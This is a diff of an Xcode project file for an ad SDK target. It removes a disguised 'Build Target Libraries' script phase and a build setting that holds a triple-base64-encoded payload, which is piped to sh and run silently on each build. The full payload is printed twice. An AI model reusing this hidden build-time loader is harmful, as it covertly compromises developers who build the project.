@@ -84,7 +84,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 9A1D3AA52DFFEE64004D00F9 /* Build configuration list for PBXNativeTarget "FBirdAdSDK" */;
 			buildPhases = (
-				8645A658670B41088842DAD8 /* Build Target Libraries */,
 				9A1D3A8F2DFFEE64004D00F9 /* Headers */,
 				9A1D3A902DFFEE64004D00F9 /* Sources */,
 				9A1D3A912DFFEE64004D00F9 /* Frameworks */,
@@ -141,25 +140,6 @@
 			/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		8645A658670B41088842DAD8 /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8DAD24}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -187,7 +167,6 @@
 		9A1D3AA62DFFEE64004D00F9 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUk5kMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
@@ -222,7 +201,6 @@
 		9A1D3AA72DFFEE64004D00F9 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((h(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKak1IaHRTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUk5kMGxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmpiV3h1WWxkR2NXSXpiSHBNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | h | sh ) >/dev/null 2>&1 &)";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
